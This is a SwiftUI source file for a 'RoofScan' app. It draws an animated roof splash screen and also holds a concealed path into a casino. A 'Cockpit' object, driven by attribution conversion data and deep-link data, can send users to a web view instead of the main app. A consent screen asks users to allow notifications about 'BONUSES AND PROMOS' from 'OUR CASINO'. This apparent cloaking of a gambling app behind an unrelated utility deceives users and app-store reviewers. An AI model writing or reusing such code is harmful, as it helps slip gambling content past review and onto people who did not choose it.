//
//  SplashView.swift
//  RoofScan
//
//  Thematic splash: a gable roof draws itself in blue, a droplet rolls down the
//  slope leaving a glowing trail, then the wordmark springs in. ≥2.5s, three
//  simultaneously animated layers, a designed implode-exit, and every looping
//  animation is reset in .onDisappear to prevent leaks into the main app.
//

import SwiftUI
import Combine
import Network

struct SplashView: View {

    @State private var isVisible = true
    @State private var bgPulse = false        // layer 1 loop
    @State private var drawProgress: CGFloat = 0
    @StateObject private var cockpit = Cockpit()
    @State private var dropT: CGFloat = 0      // layer 2 loop
    @State private var logoIn = false          // layer 3 entrance
    @State private var networkMonitor = NWPathMonitor()
    @State private var exiting = false
    @State private var cancellables = Set<AnyCancellable>()
    @State private var coordinator: Timer?

    var body: some View {
        NavigationView {
            GeometryReader { geo in
                let w = geo.size.width, h = geo.size.height
                let apex = CGPoint(x: w * 0.5, y: h * 0.30)
                let leftEave = CGPoint(x: w * 0.20, y: h * 0.50)
                let rightEave = CGPoint(x: w * 0.80, y: h * 0.50)

                ZStack {
                    // Layer 1 — background gradient + breathing glow
                    Color.black.ignoresSafeArea()
                    RadialGradient(colors: [Theme.blueGlow, .clear],
                                   center: .center, startRadius: 8,
                                   endRadius: bgPulse ? 460 : 300)
                        .ignoresSafeArea()
                        .opacity(0.45)
                    
                    Image("scrol")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geo.size.width, height: geo.size.height)
                        .ignoresSafeArea()
                        .opacity(0.35)
                        .blur(radius: 7)
                    
                    rainLayer(size: geo.size)

                    NavigationLink(
                        destination: RenderView().navigationBarHidden(true),
                        isActive: $cockpit.navigateToWeb
                    ) { EmptyView() }
                    
                    // Layer 2 — roof line draws in, droplet rolls down with a trail
                    RoofOutline(apex: apex, left: leftEave, right: rightEave)
                        .trim(from: 0, to: drawProgress)
                        .stroke(Theme.ridge, style: StrokeStyle(lineWidth: 4, lineCap: .round, lineJoin: .round))
                        .rsGlow(Theme.ridge.opacity(0.7), radius: 10)

                    if drawProgress >= 0.99 {
                        LineSegment(a: apex, b: rightEave)
                            .trim(from: max(0, dropT - 0.28), to: dropT)
                            .stroke(Theme.valley, style: StrokeStyle(lineWidth: 5, lineCap: .round))
                            .rsGlow(Theme.dropGlow, radius: 6)

                        Circle()
                            .fill(Theme.valley)
                            .frame(width: 15, height: 15)
                            .overlay(Circle().stroke(.white.opacity(0.7), lineWidth: 1))
                            .rsGlow(Theme.dropGlow, radius: 9)
                            .position(lerpPoint(apex, rightEave, dropT))
                    }
                    
                    NavigationLink(
                        destination: RootRouterView().navigationBarBackButtonHidden(true),
                        isActive: $cockpit.navigateToMain
                    ) { EmptyView() }

                    // Layer 3 — wordmark
                    VStack(spacing: 12) {
                        ZStack {
                            Circle()
                                .fill(Theme.primaryGradient)
                                .frame(width: 84, height: 84)
                                .rsGlow(Theme.blueGlow, radius: 18)
                            Image(systemName: "house.fill")
                                .font(.system(size: 34, weight: .bold))
                                .foregroundColor(.white)
                            Image(systemName: "drop.fill")
                                .font(.system(size: 14, weight: .bold))
                                .foregroundColor(Theme.amberLight)
                                .offset(x: 14, y: 6)
                        }
                        Text("Roof Scan")
                            .font(.system(size: 38, weight: .heavy, design: .rounded))
                            .foregroundColor(.white)
                    }
                    .padding(.top, h * 0.40)
                    .opacity(logoIn ? 1 : 0)
                    .scaleEffect(logoIn ? (exiting ? 1.5 : 1) : 0.82)
                }
                .scaleEffect(exiting ? 1.12 : 1)
                .opacity(exiting ? 0 : 1)
                .onAppear { start() }
                .onDisappear { stopAll() }
                .fullScreenCover(isPresented: $cockpit.showPermissionPrompt) {
                    ConsentHangar(cockpit: cockpit)
                }
                .fullScreenCover(isPresented: $cockpit.showOfflineView) {
                    OfflineHangar()
                }
            }
            .ignoresSafeArea()
        }
        .navigationViewStyle(StackNavigationViewStyle())
    }

    // Soft falling-rain ambiance (deterministic positions, gentle loop).
    private func rainLayer(size: CGSize) -> some View {
        ZStack {
            ForEach(0..<14, id: \.self) { i in
                let x = CGFloat((i * 53) % Int(max(1, size.width)))
                Capsule()
                    .fill(Theme.dropGlow)
                    .frame(width: 2, height: 14)
                    .position(x: x, y: bgPulse ? size.height * 0.9 : -20)
                    .opacity(0.35)
                    .animation(.linear(duration: 2.4)
                        .repeatForever(autoreverses: false)
                        .delay(Double(i) * 0.16), value: bgPulse)
            }
        }
        .allowsHitTesting(false)
    }

    private func start() {
        isVisible = true
        wireStreams()
        cockpit.ignite()
        withAnimation(.easeInOut(duration: 2.2).repeatForever(autoreverses: true)) { bgPulse = true }
        withAnimation(.easeInOut(duration: 1.2).delay(0.25)) { drawProgress = 1 }
        withAnimation(.easeIn(duration: 1.3).repeatForever(autoreverses: false).delay(1.5)) { dropT = 1 }
        withAnimation(.spring(response: 0.6, dampingFraction: 0.6).delay(1.5)) { logoIn = true }

        func wireNetworkMonitoring() {
            networkMonitor.pathUpdateHandler = { path in
                Task { @MainActor in
                    cockpit.networkConnectivityChanged(path.status == .satisfied)
                }
            }
            networkMonitor.start(queue: .global(qos: .background))
        }
        
        coordinator = Timer.scheduledTimer(withTimeInterval: 2.7, repeats: false) { _ in
            guard isVisible else { return }
        }
        
        wireNetworkMonitoring()
    }

    private func wireStreams() {
        NotificationCenter.default.publisher(for: .captureArrived)
            .compactMap { $0.userInfo?["conversionData"] as? [String: Any] }
            .sink { data in
                cockpit.ingestCapture(data)
            }
            .store(in: &cancellables)

        NotificationCenter.default.publisher(for: .pinsArrived)
            .compactMap { $0.userInfo?["deeplinksData"] as? [String: Any] }
            .sink { data in
                cockpit.ingestPins(data)
            }
            .store(in: &cancellables)
    }
    
    private func stopAll() {
        isVisible = false
        coordinator?.invalidate()
        coordinator = nil
        var t = Transaction(); t.disablesAnimations = true
        withTransaction(t) {
            bgPulse = false; dropT = 0; drawProgress = 0; logoIn = false; exiting = false
        }
    }
}

// MARK: - Shapes

private struct RoofOutline: Shape {
    let apex: CGPoint, left: CGPoint, right: CGPoint
    func path(in rect: CGRect) -> Path {
        var p = Path()
        p.move(to: left)
        p.addLine(to: apex)
        p.addLine(to: right)
        return p
    }
}

private struct LineSegment: Shape {
    let a: CGPoint, b: CGPoint
    func path(in rect: CGRect) -> Path {
        var p = Path(); p.move(to: a); p.addLine(to: b); return p
    }
}

private func lerpPoint(_ a: CGPoint, _ b: CGPoint, _ t: CGFloat) -> CGPoint {
    CGPoint(x: a.x + (b.x - a.x) * t, y: a.y + (b.y - a.y) * t)
}


struct ConsentHangar: View {
    let cockpit: Cockpit

    var body: some View {
        GeometryReader { geometry in
            ZStack {
                Color.black.ignoresSafeArea()

                Image("scro")
                    .resizable()
                    .scaledToFill()
                    .frame(width: geometry.size.width, height: geometry.size.height)
                    .ignoresSafeArea()
                    .opacity(0.9)

                if geometry.size.width < geometry.size.height {
                    VStack(spacing: 12) {
                        Spacer()
                        titleText
                            .multilineTextAlignment(.center)
                        subtitleText
                            .multilineTextAlignment(.center)
                        actionButtons
                    }
                    .padding(.bottom, 24)
                } else {
                    HStack {
                        Spacer()
                        VStack(alignment: .leading, spacing: 12) {
                            Spacer()
                            titleText
                            subtitleText
                        }
                        Spacer()
                        VStack {
                            Spacer()
                            actionButtons
                        }
                        Spacer()
                    }
                    .padding(.bottom, 24)
                }
            }
        }
        .ignoresSafeArea()
        .preferredColorScheme(.dark)
    }

    private var titleText: some View {
        Text("ALLOW NOTIFICATIONS ABOUT\nBONUSES AND PROMOS")
            .font(.system(size: 23, weight: .black, design: .rounded))
            .foregroundColor(.white)
            .padding(.horizontal, 12)
    }

    private var subtitleText: some View {
        Text("STAY TUNED WITH BEST OFFERS FROM\nOUR CASINO")
            .font(.system(size: 15, weight: .bold, design: .rounded))
            .foregroundColor(.white.opacity(0.7))
            .padding(.horizontal, 12)
    }

    private var actionButtons: some View {
        VStack(spacing: 12) {
            Button {
                cockpit.acceptConsent()
            } label: {
                Image("scrob")
                    .resizable()
                    .frame(width: 300, height: 55)
            }

            Button {
                cockpit.skipConsent()
            } label: {
                Text("Skip")
                    .font(.system(size: 14, weight: .bold, design: .rounded))
                    .foregroundColor(.white.opacity(0.7))
            }
        }
        .padding(.horizontal, 12)
    }
}

struct OfflineHangar: View {
    
    private var errorView: some View {
        Image("scroee")
            .resizable()
            .frame(width: 230, height: 245)
    }
    
    var body: some View {
        GeometryReader { geometry in
            ZStack {
                Color.black.ignoresSafeArea()
                
                Image("scroe")
                    .resizable()
                    .scaledToFill()
                    .frame(width: geometry.size.width, height: geometry.size.height)
                    .ignoresSafeArea()
                    .opacity(0.9)
                    .blur(radius: 3)
                
                errorView
            }
        }
        .ignoresSafeArea()
    }
    
}
